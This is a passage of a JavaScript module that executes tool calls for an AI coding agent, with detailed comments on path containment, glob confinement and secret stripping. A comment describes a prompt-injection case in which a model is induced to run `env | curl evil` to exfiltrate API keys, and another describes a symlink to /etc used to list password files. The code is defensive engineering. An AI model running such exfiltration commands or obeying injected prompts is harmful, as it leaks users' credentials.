/**
 * Dispatch a tool_use block from the model to the local executor that
 * implements it. Owns the result shape: returns `{ content, isError }`
 * matching what gets put inside a `tool_result` content block sent
 * back to the API on the next turn.
 *
 * All tools are gated through the caller's permission flow before this
 * runs — by the time we get here, the user has approved the call (or
 * the session is in `auto` mode which auto-approves). We don't do
 * permission gating in here; this module is execution only.
 *
 * Path safety is enforced for file tools by validateRawPathWithinCwd from
 * ws-file-ops/common.js — every file_path is resolved COMPONENT BY COMPONENT
 * (open(2)-faithfully) and confirmed to be inside the session cwd before any
 * read/write happens. Symlink escapes — including a `..` that follows a
 * symlinked component (#6923) — are blocked by walking the RAW path rather than
 * a pre-`resolve()`d one (see common.js + the 2026-04-11 production-readiness
 * audit).
 */

import { dirname, join, relative } from 'node:path'
import { glob as fsGlob, readdir } from 'node:fs/promises'
import { isIP } from 'node:net'
import { lookup as dnsLookup } from 'node:dns/promises'
import { validateRawPathWithinCwd } from './ws-file-ops/common.js'
import { executeBash, DEFAULT_BASH_TIMEOUT_MS } from './built-in-tools/bash-exec.js'
import { readFileTool, writeFileTool, editFileTool } from './built-in-tools/file-ops.js'
import {
  GLOB_PATTERN_SHELL_METACHARS,
  globPatternEscapeReason,
  globPatternEscapeMessage,
  buildGrepArgs,
  buildGrepCommand,
} from './built-in-tools/tool-transforms.js'
import { TODO_STATUSES, BUILTIN_TOOL_NAMES } from './byok-tools.js'
// #4186: SSRF block-list lives in its own module so the (ip, expected)
// table can grow without bloating this file's WebFetch integration tests.
// The exported helpers retain the same names as the original locals so
// the call sites below read identically.
import { isPrivateOrSpecialIp } from './ssrf-guard.js'

/**
 * Cap on Bash timeout the model can request. 10 minutes is the same
 * ceiling chroxy's Bash tool uses elsewhere — long enough for a slow
 * test suite, short enough to not strand a session if a runaway loop
 * hangs.
 */
const BASH_TIMEOUT_CEILING_MS = 600_000

/**
 * Two bounds, because they do different jobs.
 *
 * `GLOB_COLLECT_CEILING` is the memory backstop on the walk. `GLOB_MAX_MATCHES`
 * is how many paths the model is shown. Collecting more than we return is what
 * makes truncation a SORTED PREFIX rather than an arbitrary subset — and that
 * distinction was a real defect, not a nicety: with a single 10 000 cap on an
 * unsorted traversal, `Glob **\/*.ts` over a 20 000-file tree returned 10 000
 * paths, `isError: false`, no marker, and `d00`–`d09` — half the tree, the
 * alphabetically-first half — simply absent. A model would conclude those
 * directories contain no TypeScript.
 */
const GLOB_COLLECT_CEILING = 50_000
const GLOB_MAX_MATCHES = 10_000

/**
 * Wall-clock bound on a Glob walk. Matches the 30s `executeBash` timeout the
 * shell implementation had — dropping the subprocess dropped its kill, and
 * `fs.glob` honours no AbortSignal of its own.
 *
 * Read per call, not at module load, and overridable via
 * `CHROXY_GLOB_TIMEOUT_MS`. That knob is what lets the timeout be PROVEN: a
 * test asserting a 30s bound by waiting 30s does not get written, and a test
 * that only checks the happy path is a guard whose success and whose absence
 * look identical (docs/false-safety-guards.md). A very large monorepo wanting
 * a longer budget is the secondary use.
 */
const GLOB_TIMEOUT_DEFAULT_MS = 30_000
function globTimeoutMs() {
  // Trim and require a NON-EMPTY, strictly positive integer, matching every
  // other env-timeout parser in this package (config.js, prompt-evaluator.js,
  // claude-tui-session.js). The first cut used `Number(raw) >= 0`, and
  // `Number('') === 0`: an exported-but-empty `CHROXY_GLOB_TIMEOUT_MS=` — what
  // a bare `.env` line and `docker run -e VAR` both produce — gave every Glob
  // call a 0 ms budget and disabled the tool outright, with nothing pointing at
  // the cause. The knob exists to make the timeout testable; it must not be a
  // way to switch Glob off by accident.
  const raw = (process.env.CHROXY_GLOB_TIMEOUT_MS || '').trim()
  if (!/^\d+$/.test(raw)) return GLOB_TIMEOUT_DEFAULT_MS
  const n = Number(raw)
  return n > 0 ? n : GLOB_TIMEOUT_DEFAULT_MS
}

/**
 * Env vars the model must NEVER see in a Bash subprocess. Centrally
 * the BYOK API key — if a malicious prompt induces the model to run
 * `env | curl evil`, the model exfiltrates the user's API credentials
 * (caught by /agent-review on PR #4060 — see #4069). Plus chroxy's
 * own per-session secrets that are scoped to the WS auth surface.
 *
 * Note: we do NOT redact every var that looks like a secret (e.g.
 * GITHUB_TOKEN, AWS_*). The user might legitimately need those in
 * their shell — they're the workspace owner. Only redact chroxy-
 * specific credentials the model has no business reading.
 */
const SECRET_ENV_DENYLIST = new Set([
  'ANTHROPIC_API_KEY',
  'CLAUDE_CODE_OAUTH_TOKEN',
])

/**
 * Build an env for the Bash/Glob/Grep subprocess that strips chroxy's
 * own secrets. Returns a plain object — pass to executeBash's `env`.
 */
function buildSafeBashEnv() {
  const out = {}
  for (const [k, v] of Object.entries(process.env)) {
    if (SECRET_ENV_DENYLIST.has(k)) continue
    out[k] = v
  }
  return out
}

/**
 * Dispatch a single tool_use block.
 *
 * @param {object} args
 * @param {string} args.toolName       The tool name from the model
 * @param {object} args.input          The tool's input arguments (already parsed JSON)
 * @param {string} args.cwd            Session cwd — anchor for path safety
 * @param {Map} args.cwdRealCache      Per-session cache of resolved real paths
 * @param {number} args.cwdCacheTtl    Cache TTL in ms
 * @param {AbortSignal} [args.signal]  Optional abort signal — Bash exec listens
 * @param {Map}         [args.todoStore]  Per-session TodoWrite list (id → item)
 * @returns {Promise<{ content: string, isError: boolean }>}
 */
export async function executeBuiltinTool({
  toolName,
  input,
  cwd,
  cwdRealCache,
  cwdCacheTtl,
  signal,
  todoStore,
}) {
  try {
    switch (toolName) {
      case 'Read':
        return await runRead({ input, cwd, cwdRealCache, cwdCacheTtl })
      case 'Write':
        return await runWrite({ input, cwd, cwdRealCache, cwdCacheTtl })
      case 'Edit':
        return await runEdit({ input, cwd, cwdRealCache, cwdCacheTtl })
      case 'Bash':
        return await runBash({ input, cwd, signal })
      case 'Glob':
        return await runGlob({ input, cwd, cwdRealCache, cwdCacheTtl, signal })
      case 'Grep':
        return await runGrep({ input, cwd, cwdRealCache, cwdCacheTtl, signal })
      case 'WebFetch':
        return await runWebFetch({ input, signal })
      case 'TodoWrite':
        return runTodoWrite({ input, todoStore })
      default: {
        // Derive the list from BUILTIN_TOOL_NAMES so adding a tool only
        // requires updating byok-tools.js — this message can't drift.
        const known = [...BUILTIN_TOOL_NAMES].sort().join(', ')
        return {
          content: `Unknown tool: ${toolName}. The claude-byok provider ships with: ${known}. MCP and other tools land in follow-up issues.`,
          isError: true,
        }
      }
    }
  } catch (err) {
    // Anything that escapes the per-tool runner becomes an error
    // tool_result so the model can see what went wrong and possibly
    // recover. The error message is sanitized — no stack traces, just
    // the error message line.
    return {
      content: `Tool ${toolName} failed: ${err?.message || String(err)}`,
      isError: true,
    }
  }
}

/** Resolve a tool-supplied path against cwd, then validate it's inside. */
async function safeResolve(filePath, cwd, cwdRealCache, cwdCacheTtl) {
  if (typeof filePath !== 'string' || filePath.length === 0) {
    throw Object.assign(new Error('file_path is required'), { code: 'EINVAL' })
  }
  // #6923 — hand the RAW filePath (its `..` intact) to the component-wise walker.
  // Do NOT pre-`resolve(cwd, filePath)`: `resolve()` collapses a `..` that follows
  // a symlinked component LEXICALLY, so `link/../x` cancelled the symlink before it
  // was followed and an escape via a symlink-out-of-workspace + `..` looked in
  // bounds. validateRawPathWithinCwd walks the raw path open(2)-faithfully so the
  // true (escaping) destination is seen and rejected.
  const { valid, realPath, cwdReal } = await validateRawPathWithinCwd(
    filePath,
    cwd,
    cwdRealCache,
    cwdCacheTtl,
  )
  if (!valid) {
    throw Object.assign(
      new Error(`path outside workspace: ${filePath} resolves to ${realPath}, expected under ${cwdReal}`),
      { code: 'EACCES' },
    )
  }
  return realPath
}

async function runRead({ input, cwd, cwdRealCache, cwdCacheTtl }) {
  const realPath = await safeResolve(input?.file_path, cwd, cwdRealCache, cwdCacheTtl)
  const result = await readFileTool({
    filePath: realPath,
    offset: input?.offset,
    limit: input?.limit,
  })
  if (!result.ok) return { content: `${result.code}: ${result.message}`, isError: true }
  const tail = result.truncatedByLimit
    ? `\n\n[showed ${result.linesReturned} of ${result.totalLines} lines]`
    : ''
  return { content: result.content + tail, isError: false }
}

async function runWrite({ input, cwd, cwdRealCache, cwdCacheTtl }) {
  const realPath = await safeResolve(input?.file_path, cwd, cwdRealCache, cwdCacheTtl)
  const result = await writeFileTool({
    filePath: realPath,
    content: input?.content,
  })
  if (!result.ok) return { content: `${result.code}: ${result.message}`, isError: true }
  return {
    content: `Wrote ${result.bytesWritten} bytes to ${input.file_path}${result.created ? ' (created)' : ''}.`,
    isError: false,
  }
}

async function runEdit({ input, cwd, cwdRealCache, cwdCacheTtl }) {
  const realPath = await safeResolve(input?.file_path, cwd, cwdRealCache, cwdCacheTtl)
  const result = await editFileTool({
    filePath: realPath,
    oldString: input?.old_string,
    newString: input?.new_string,
    replaceAll: input?.replace_all === true,
  })
  if (!result.ok) return { content: `${result.code}: ${result.message}`, isError: true }
  return {
    content: `Replaced ${result.replacements} occurrence(s) in ${input.file_path}.`,
    isError: false,
  }
}

async function runBash({ input, cwd, signal }) {
  const command = input?.command
  if (typeof command !== 'string' || command.length === 0) {
    return { content: 'EINVAL: command is required', isError: true }
  }
  const requested = Number(input?.timeout)
  const timeoutMs = Number.isFinite(requested) && requested > 0
    ? Math.min(requested, BASH_TIMEOUT_CEILING_MS)
    : DEFAULT_BASH_TIMEOUT_MS

  const result = await executeBash({
    command,
    cwd,
    timeoutMs,
    signal,
    env: buildSafeBashEnv(),
  })

  // Build a single text payload — stdout, then stderr (if any), then a
  // status line. The model is the consumer here, so we err on the side
  // of being verbose about timing and exit state.
  const parts = []
  if (result.stdout) parts.push(`stdout:\n${result.stdout}`)
  if (result.stderr) parts.push(`stderr:\n${result.stderr}`)
  const statusBits = []
  if (result.timedOut) statusBits.push(`timed out after ${timeoutMs}ms`)
  if (result.aborted) statusBits.push('aborted')
  if (result.truncated) statusBits.push('output truncated at cap')
  statusBits.push(`exit=${result.exitCode ?? 'killed'}`)
  if (result.signal) statusBits.push(`signal=${result.signal}`)
  statusBits.push(`${result.durationMs}ms`)
  parts.push(`[${statusBits.join(', ')}]`)

  return {
    content: parts.join('\n\n'),
    isError: result.exitCode !== 0 || result.timedOut || result.aborted,
  }
}

// Characters in a glob pattern that allow shell-side command substitution
// or piping (GLOB_PATTERN_SHELL_METACHARS + the command builders live in the
// shared tool-transforms.js, so the host and the docker-byok container reject
// and shell out identically — #4070 / #5882).

async function runGlob({ input, cwd, cwdRealCache, cwdCacheTtl, signal }) {
  const pattern = input?.pattern
  if (typeof pattern !== 'string' || pattern.length === 0) {
    return { content: 'EINVAL: pattern is required', isError: true }
  }
  if (GLOB_PATTERN_SHELL_METACHARS.test(pattern)) {
    return {
      content: 'EINVAL: glob pattern contains shell-dangerous characters ($, `, ;, |, &, <, >, (, ), \\, newline)',
      isError: true,
    }
  }
  // #7341 — the metachar denylist above closes shell INJECTION only; it says
  // nothing about where the glob expands to. Containment is a separate rule.
  const escapeReason = globPatternEscapeReason(pattern)
  if (escapeReason) {
    return { content: globPatternEscapeMessage(escapeReason), isError: true }
  }

  // Realpath-validate the search ROOT against cwd. Pre-fix this was a
  // weak "no ..." check that let absolute paths to /etc through.
  const realRoot = await safeResolveRoot(input?.path, cwd, cwdRealCache, cwdCacheTtl)

  // #7341 — the host does NOT shell out for Glob any more. `for f in
  // <pattern>` needed the pattern interpolated UNQUOTED to expand at all, and
  // two review rounds found six ways to make that expansion leave the
  // workspace (quote removal, whitespace word-splitting, a brace body with no
  // top-level comma, `.*` matching the `..` entry, POSIX bracket
  // sub-expressions, nested braces) — none of them visible in the source text.
  // `node:fs/promises`'s glob has none of those layers: no tilde expansion, no
  // word splitting, no quote removal. The question "what will bash do with
  // this string" simply stops being asked. (The container still shells out —
  // it cannot run JS inside itself — and confines its RESULTS instead.)
  //
  // `withFileTypes` is not cosmetic: the Dirent carries `isSymbolicLink()`,
  // which the traversal already knows, so the confinement below can single out
  // symlink entries for a realpath WITHOUT paying a syscall on every ordinary
  // file.
  //
  // `fs.glob` IGNORES an AbortSignal (measured on Node 22 — passing an
  // already-aborted one completes normally), and dropping `executeBash` also
  // dropped its 30s kill. So the bound is rebuilt here: a flag the loop checks
  // at each yield, plus a race so the TOOL CALL returns on time even when the
  // walk is between yields. The walk itself can only stop at a yield, which is
  // stated rather than papered over.
  // #7341 — if the pattern NAMES a directory outright and that directory
  // resolves outside the workspace, say so instead of returning "No matches".
  //
  // Containment itself is unchanged: every match is still confined below, and
  // a symlink the caller merely DISCOVERED through a wildcard is still withheld
  // in silence, because naming it would be the existence oracle that silence
  // exists to prevent. This is the other case. When the caller writes
  // `node_modules/**` and `node_modules` is a symlink into a pnpm store, a
  // shared `.venv`, or a sibling repo, "No matches" is a baffling answer to a
  // question the caller already knew the shape of — and it leaks nothing,
  // because passing the very same path as `input.path` ALREADY returns exactly
  // this error. It also makes `pattern` and `path` consistent rather than
  // mysteriously different for the same directory.
  const literalPrefix = literalDirPrefix(pattern)
  if (literalPrefix) {
    await safeResolveRoot(literalPrefix, realRoot, cwdRealCache, cwdCacheTtl)
  }

  // Check the signal BEFORE the walk: the in-loop check is only reached when
  // the glob yields, so an already-aborted call on a pattern that matches
  // nothing used to run the whole tree and then report a cheerful "No matches".
  // The container Glob has always had this pre-check; the host lacked it, which
  // made the two backends answer differently for identical input.
  if (signal?.aborted) return { content: 'Glob interrupted', isError: true }

  const files = []
  // ONE timer sets the flag and releases the race, so the two cannot resolve
  // in either order — a second, independent timer would let the race finish
  // before `stop` was assigned and report success on a timed-out walk. The
  // abort listener shares that single release for the same reason.
  let stop = null
  let releaseDeadline
  const deadlineReached = new Promise((resolve) => { releaseDeadline = resolve })
  const timeoutMs = globTimeoutMs()
  const deadline = setTimeout(() => { stop = 'timed out'; releaseDeadline() }, timeoutMs)
  deadline.unref?.()
  const onAbort = () => { stop = 'interrupted'; releaseDeadline() }
  signal?.addEventListener?.('abort', onAbort, { once: true })
  const collect = (async () => {
    for await (const entry of fsGlob(pattern, { cwd: realRoot, withFileTypes: true })) {
      if (stop) break
      const rel = relative(realRoot, join(entry.parentPath, entry.name))
      // `**` yields the search root itself, which `relative()` renders as ''.
      // The root is not a match; emitting it produced a blank first line (and
      // a bare '' on an empty workspace) that the shell implementation never
      // did.
      if (rel === '') continue
      files.push({ path: rel, isSymlink: entry.isSymbolicLink() })
      if (files.length >= GLOB_COLLECT_CEILING) break
    }
  })()
  // Attach a catch BEFORE the race: if the walk rejects after the deadline has
  // already settled it, the rejection would otherwise be unhandled.
  let walkError = null
  collect.catch((err) => { walkError = err })
  try {
    await Promise.race([collect, deadlineReached])
  } catch (err) {
    walkError = err
  }
  clearTimeout(deadline)
  signal?.removeEventListener?.('abort', onAbort)
  if (walkError) {
    return { content: `Glob failed: ${walkError?.message || String(walkError)}`, isError: true }
  }
  if (stop === 'timed out') {
    return { content: `Glob timed out after ${timeoutMs}ms`, isError: true }
  }
  if (stop === 'interrupted') return { content: 'Glob interrupted', isError: true }
  let kept = await confineGlobMatches(files, realRoot, cwdRealCache, cwdCacheTtl, pattern)
  // #7357 — a match containing an embedded newline cannot be told apart, in a
  // '\n'-joined text result, from two separate matches: `sub/deep/nl\nSECRET`
  // reads back as `sub/deep/nl` and `SECRET` on two lines, and the second of
  // those is a path that does not exist as spelled. NUL is the only byte a
  // POSIX filename cannot contain, but the tool_result handed back to the
  // model is plain '\n'-joined text (not NUL-delimited), so there is no
  // encoding that stays both unambiguous AND a single text line. Dropping is
  // the one option of the two the issue names ("emitted unambiguously or
  // skipped, never split") that needs no new escape syntax for the model to
  // learn, and it is applied identically here and in the container path
  // (docker-byok-session.js's `_containerGlob`) so the two backends agree on
  // what "the same input" means. This is a display-format decision, not a
  // containment one — the match is not a security-relevant withholding, so it
  // gets no daemon-log line the way an escaping match does.
  kept = kept.filter((f) => !f.includes('\n'))
  // A withheld match is reported as no match, with no count and no marker.
  // Anything that distinguishes "matched, but outside" from "matched nothing"
  // is an existence ORACLE: a workspace that contains `esc -> /` turns one bit
  // per call into filesystem enumeration, on a tool that is auto-approved in
  // `acceptEdits`. The confinement is proven by tests, not by a runtime marker.
  if (kept.length === 0) return { content: `No matches for ${pattern}`, isError: false }

  // Sort. Every shell glob does, on both the old host and the container;
  // `fs.glob` yields in traversal order. Deterministic-but-different reshuffles
  // the whole listing for a one-file change and destroys the alphabetical
  // grouping that makes a long result readable.
  kept.sort()

  // TRUNCATION IS ANNOUNCED. The oracle argument that justifies silence for
  // withheld matches does not apply here: a count of in-workspace matches
  // reveals nothing about anything outside it, and silently dropping paths
  // makes Glob wrong by omission with nothing to tell the model.
  if (kept.length > GLOB_MAX_MATCHES) {
    const total = files.length >= GLOB_COLLECT_CEILING ? `${kept.length}+` : `${kept.length}`
    const shown = kept.slice(0, GLOB_MAX_MATCHES)
    shown.push(`[truncated: showing ${GLOB_MAX_MATCHES} of ${total} matches — narrow the pattern or use "path"]`)
    return { content: shown.join('\n'), isError: false }
  }
  return { content: kept.join('\n'), isError: false }
}

/**
 * SECURITY (#7341) — second containment layer for Glob, after the syntactic
 * `globPatternEscapeReason` check. Drops any expanded match whose real
 * location is outside the workspace.
 *
 * Why a second layer at all: no inspection of the pattern can see a symlinked
 * DIRECTORY sitting inside the workspace. With `esc -> /etc` present, the
 * pattern `esc/pass*` contains no `~`, no `/` prefix and no `..` — every
 * character is legal — and it lists `/etc`. Only resolving the RESULTS catches
 * that, which is why the syntactic guard is not treated as sufficient here.
 *
 * The property it establishes is the strong one, stated without caveats:
 * EVERY path Glob returns resolves inside the workspace. An earlier cut
 * checked only each match's parent directory, which let a symlink whose NAME
 * is in the workspace but whose TARGET is outside be listed. That is arguably
 * defensible — the entry really is in the directory, and `Read` would refuse
 * to follow it — but it makes the tool's contract a sentence with an
 * exception in it, and the property test caught it precisely because the
 * exception could not be stated cleanly. Withholding it costs a listing
 * nobody can act on.
 *
 * Two checks, split so the common case is free:
 *   - the match's PARENT, cached per directory. Catches traversal and any
 *     descent through a symlinked directory. Matches cluster into few
 *     directories, so this is one `open(2)`-faithful walk per directory, not
 *     one per file.
 *   - the ENTRY itself, but only when the glob's own Dirent already said it is
 *     a symlink. Ordinary files — nearly all of them — cost nothing extra.
 *
 * FAIL-CLOSED: a match that cannot be resolved (EACCES, ELOOP, depth bomb) is
 * withheld, never emitted.
 *
 * SECURITY (#7355) — also enforces CASE-SENSITIVE matching. `fs.glob` hard-codes
 * `nocase: isWindows || isMacOS` internally (measured on Node 22.22.3: an
 * explicit `nocase: false` is silently ignored), so on those two platforms a
 * literal segment like `Config.ts` matches an on-disk `config.ts`, and — worse —
 * for a fully-literal pattern the returned "match" is the PATTERN's own
 * spelling, not a real path (`Glob ABC.TS` against a real `ABC.ts` returns
 * `ABC.TS`, which does not exist as written). The container shells out to bash,
 * whose globbing has no such override and is case-sensitive by construction, so
 * an unfixed host silently disagrees with both the container and with Claude
 * Code's own Glob. {@link caseCheckPasses} re-decides case-sensitively, using
 * the REAL on-disk name at every path segment ({@link realSegmentNames}) rather
 * than trusting the candidate's own text — the pattern-echo bug above means the
 * candidate's text cannot be trusted for a literal segment in the first place.
 *
 * @param {{path: string, isSymlink: boolean}[]} files
 * @param {string} pattern The original Glob pattern, for the case re-check.
 * @returns {Promise<string[]>} The matches that are inside the workspace.
 */
async function confineGlobMatches(files, realRoot, cwdRealCache, cwdCacheTtl, pattern) {
  const dirVerdicts = new Map()
  const direntCache = new Map()
  const caseCheck = compileCaseCheck(pattern)
  const kept = []
  for (const { path: f, isSymlink } of files) {
    // Relative to realRoot — that is the directory the glob ran in. Pass the
    // RAW relative path (#6923: never pre-`resolve()`, a lexical `..` collapse
    // hides a symlink escape).
    const rawDir = dirname(f)
    let ok = dirVerdicts.get(rawDir)
    if (ok === undefined) {
      ok = await isWithin(rawDir, realRoot, cwdRealCache, cwdCacheTtl)
      dirVerdicts.set(rawDir, ok)
    }
    if (ok && isSymlink) ok = await isWithin(f, realRoot, cwdRealCache, cwdCacheTtl)
    // #7355 — emit the REAL on-disk spelling, never the candidate text `f`.
    // For a fully-literal pattern segment the two are provably identical
    // whenever `ok` ends up true (the case-sensitive regex only accepts a
    // real segment equal to the pattern's own literal text), so this is a
    // no-op there. But for a pattern segment with more than one textual form
    // that can fold to the SAME real name under `fs.glob`'s nocase matching
    // — a brace alternative being the clearest case, `{abc,ABC}.ts` against a
    // real `ABC.ts` — `fs.glob` hands back ONE raw candidate PER matching
    // alternative (`abc.ts` and `ABC.ts`, both echoing their own branch's
    // text), and both independently pass the case check because the pattern
    // legitimately accepts either spelling. Pushing `f` there kept BOTH: the
    // real `ABC.ts` and a phantom `abc.ts` that does not exist on disk —
    // exactly the "pattern's own spelling, not the file's" defect #7355 was
    // filed to close, just reached through a different pattern shape than the
    // fully-literal one the issue's repro used. Substituting the verified
    // real segments (and deduping below) closes it for every pattern shape,
    // not only the literal one.
    let out = f
    if (ok) {
      const realSegments = await realSegmentNames(realRoot, splitRelPath(f), direntCache)
      ok = realSegments !== null && caseCheckPasses(caseCheck, realSegments)
      if (ok) out = join(...realSegments)
    }
    if (ok) kept.push(out)
  }
  // Dedupe: two raw candidates that both resolve to the same real path (the
  // brace-alternative case above) must surface as one match, not two.
  return [...new Set(kept)]
}

/**
 * #7355 — split a Glob match's relative path into segments, separating on
 * BOTH `/` and `\` (the match came from `node:path`'s `relative()`, which is
 * platform-native — see #6928 for why a single-separator split is unsafe).
 * The pattern itself never needs this: `\` is one of the characters
 * {@link GLOB_PATTERN_SHELL_METACHARS} rejects outright, so a pattern is
 * always plain `/`-delimited.
 */
function splitRelPath(f) {
  return f.split(/[/\\]+/).filter(Boolean)
}

/**
 * #7355 — reconstruct the REAL on-disk name of every segment of a match path,
 * via a cached `readdir` at each level.
 *
 * Why this cannot just trust the segment text `fs.glob` handed back: for a
 * segment that contains NO glob metacharacter, `fs.glob` verifies existence
 * case-INSENSITIVELY and then echoes the PATTERN's own text for that segment —
 * not the real Dirent name (measured: pattern `upper.ts` against a real
 * `Upper.TS` returns the match spelled `upper.ts`). Only a segment containing a
 * metacharacter is guaranteed real (it came from an actual directory listing).
 * Re-deriving every segment from `readdir` — cheap here since it is cached per
 * directory, the same shape as `confineGlobMatches`' own `dirVerdicts` — sidesteps
 * needing to know, path by path, which case applied.
 *
 * The case-insensitive `toLowerCase()` lookup only RELOCATES an entry `fs.glob`
 * already proved exists (by matching it, insensitively); it does not itself
 * decide anything security-relevant. {@link caseCheckPasses} is what enforces
 * case-sensitivity, by testing the pattern against the name this returns.
 *
 * FAIL-CLOSED: an unreadable directory, or a segment with no case-insensitive
 * match in a real listing (should not happen — `fs.glob` already found one),
 * returns `null`, and the caller withholds the match.
 *
 * @returns {Promise<string[]|null>}
 */
async function realSegmentNames(realRoot, segments, direntCache) {
  const real = []
  let dirAbs = realRoot
  for (const seg of segments) {
    let names = direntCache.get(dirAbs)
    if (names === undefined) {
      try {
        names = await readdir(dirAbs)
      } catch {
        names = null
      }
      direntCache.set(dirAbs, names)
    }
    if (!names) return null
    const lower = seg.toLowerCase()
    const realName = names.find((n) => n.toLowerCase() === lower)
    if (realName === undefined) return null
    real.push(realName)
    dirAbs = join(dirAbs, realName)
  }
  return real
}

/**
 * #7355 — compile a single glob PATTERN SEGMENT (no `/`) to case-SENSITIVE
 * RegExp source. Scope is exactly the syntax {@link GLOB_PATTERN_SHELL_METACHARS}
 * lets through to `fs.glob`: `*`, `?`, `[...]`/`[!...]`/`[^...]` bracket
 * expressions (with `-` ranges), and `{a,b}` brace alternation (recursive — an
 * alternative may itself contain any of the above, including nested braces).
 * No backslash escapes: `\` is rejected from every Glob pattern upstream, so
 * none are interpreted here either — every other character is a literal.
 *
 * `*`/`?` compile to `[\s\S]` runs rather than `.`, so they still match a
 * literal newline WITHIN a segment (a filename may legally contain one — see
 * #7357) — irrelevant to matching correctness (a segment can never contain
 * `/`, so there is nothing for `[\s\S]` to over-match into), but it keeps this
 * check from silently rejecting a real file for an unrelated reason.
 */
function segmentToRegexSource(seg) {
  let out = ''
  let i = 0
  while (i < seg.length) {
    const c = seg[i]
    if (c === '*') {
      out += '[\\s\\S]*'
      i++
    } else if (c === '?') {
      out += '[\\s\\S]'
      i++
    } else if (c === '[') {
      const parsed = parseBracketExpr(seg, i)
      if (parsed) {
        out += parsed.source
        i = parsed.next
      } else {
        out += '\\['
        i++
      }
    } else if (c === '{') {
      const close = findMatchingBrace(seg, i)
      if (close === -1) {
        out += '\\{'
        i++
      } else {
        const alts = splitTopLevelCommas(seg.slice(i + 1, close))
        out += `(?:${alts.map(segmentToRegexSource).join('|')})`
        i = close + 1
      }
    } else {
      out += /[.*+?^${}()|[\]\\]/.test(c) ? `\\${c}` : c
      i++
    }
  }
  return out
}

/**
 * Parse a `[...]` bracket expression starting at `seg[openIdx] === '['`.
 * Returns `null` (caller treats `[` as a literal) when there is no closing
 * `]` — the same "unmatched metachar is literal" rule glob implementations
 * use. A `]` immediately after `[` or `[!`/`[^` is a literal `]`, per POSIX.
 */
function parseBracketExpr(seg, openIdx) {
  let j = openIdx + 1
  let negate = false
  if (seg[j] === '!' || seg[j] === '^') {
    negate = true
    j++
  }
  const start = j
  if (seg[j] === ']') j++
  while (j < seg.length && seg[j] !== ']') j++
  if (j >= seg.length) return null
  const body = seg.slice(start, j)
  if (body.length === 0) return null
  // '-' is left alone (ranges mean the same thing in a JS class); '^' and ']'
  // are escaped so an unlucky position (leading '^', an already-consumed
  // leading ']') can't be misread as class syntax.
  const classBody = body.replace(/\^/g, '\\^').replace(/\]/g, '\\]')
  return { source: `[${negate ? '^' : ''}${classBody}]`, next: j + 1 }
}

/** Index of the `}` matching `seg[openIdx] === '{'`, or -1 if unmatched. */
function findMatchingBrace(seg, openIdx) {
  let depth = 1
  let j = openIdx + 1
  while (j < seg.length) {
    if (seg[j] === '{') depth++
    else if (seg[j] === '}') { depth--; if (depth === 0) return j }
    j++
  }
  return -1
}

/** Split a `{a,b,c}` body on top-level commas (commas inside nested `{}` don't count). */
function splitTopLevelCommas(s) {
  const parts = []
  let depth = 0
  let start = 0
  for (let i = 0; i < s.length; i++) {
    if (s[i] === '{') depth++
    else if (s[i] === '}') depth--
    else if (s[i] === ',' && depth === 0) {
      parts.push(s.slice(start, i))
      start = i + 1
    }
  }
  parts.push(s.slice(start))
  return parts
}

/**
 * Sentinel distinguishing a `**` (globstar) pattern segment from a compiled
 * per-segment RegExp in {@link compileCaseCheck}'s `matchers` array. A Symbol
 * rather than the string `'**'` so it can never collide with a RegExp value.
 */
const CASE_CHECK_GLOBSTAR = Symbol('globstar')

/**
 * #7355 — compile a whole Glob pattern into the pieces {@link caseCheckPasses}
 * needs: the pattern has no `/` inside a segment (patterns are always
 * `/`-delimited — `\` is rejected upstream), so it is split on `/` and each
 * segment compiled independently via {@link segmentToRegexSource}. A `**`
 * segment compiles to {@link CASE_CHECK_GLOBSTAR} instead of a RegExp — it
 * matches zero or more REAL path segments, which are, by construction,
 * always real Dirent names (a `**` carries no literal text of its own to
 * mismatch), so segments it absorbs need no case check at all.
 *
 * Any number of `**` segments is supported: {@link caseCheckPasses} aligns
 * `matchers` against a match's real segments with the standard array
 * wildcard-matching DP (the same shape as string wildcard matching, just one
 * path segment at a time instead of one character at a time), so it is never
 * ambiguous which real segments a `**` absorbed in the sense that matters
 * here — the DP considers every split and accepts if ANY of them makes the
 * whole pattern match. An earlier version special-cased "at most one `**`"
 * and failed closed (rejected every match) for two or more, which silently
 * dropped every match — including already-correctly-cased ones — for an
 * ordinary pattern shape like `packages/**\/src/**\/*.test.js`; verified
 * against origin/main pre-#7355 that the identical fixture returned both
 * matches there, so this was a regression #7355 introduced, not a pre-existing
 * limitation worth keeping.
 *
 * Empty and `.` segments are dropped before compiling: `fs.glob` normalizes
 * both away in what it actually returns (measured: `./src/*.ts` yields a
 * Dirent whose name/parentPath never mention the leading `.`; same for a
 * `.` in the middle, e.g. `src/./x.ts`, or an empty segment from `src//x.ts`)
 * — it echoes neither a `.` component nor an empty one in any match. Compiling
 * the pattern's OWN segment list unfiltered made `./src/*.ts` (3 segments:
 * `.`, `src`, `*.ts`) impossible to align with the real match's 2 segments
 * (`src`, `x.ts`), failing every match closed. `./`-prefixed patterns are
 * explicitly allowed (`globPatternEscapeReason` has no rule against a bare
 * `.` segment), so this was a real regression, not a theoretical one —
 * verified against origin/main pre-#7355 that `./src/*.ts` matched there.
 */
function compileCaseCheck(pattern) {
  const patSegs = pattern.split('/').filter((s) => s !== '' && s !== '.')
  const matchers = patSegs.map((s) => (s === '**' ? CASE_CHECK_GLOBSTAR : new RegExp(`^${segmentToRegexSource(s)}$`)))
  return { matchers }
}

/**
 * Test a {@link compileCaseCheck} result against a match's REAL segment names,
 * via the classic wildcard-matching DP over arrays (not strings): `dp[j]` is
 * true when the matchers processed so far can align with the first `j` real
 * segments. A literal matcher consumes exactly one real segment (case-
 * sensitively); a {@link CASE_CHECK_GLOBSTAR} matcher can consume any number
 * (0..j), computed as a running OR (prefix-OR) rather than an inner loop.
 */
function caseCheckPasses(check, realSegments) {
  const { matchers } = check
  const n = realSegments.length
  let dp = new Array(n + 1).fill(false)
  dp[0] = true
  for (const matcher of matchers) {
    const next = new Array(n + 1).fill(false)
    if (matcher === CASE_CHECK_GLOBSTAR) {
      let seenTrue = false
      for (let j = 0; j <= n; j++) {
        seenTrue = seenTrue || dp[j]
        next[j] = seenTrue
      }
    } else {
      for (let j = 1; j <= n; j++) {
        next[j] = dp[j - 1] && matcher.test(realSegments[j - 1])
      }
    }
    dp = next
  }
  return dp[n]
}

/**
 * The leading run of LITERAL directory segments in a glob pattern — the part
 * the caller named outright rather than asked the matcher to discover.
 *
 * `node_modules/**` → `node_modules`; `src/**\/*.ts` → `src`; `*.ts` → ''.
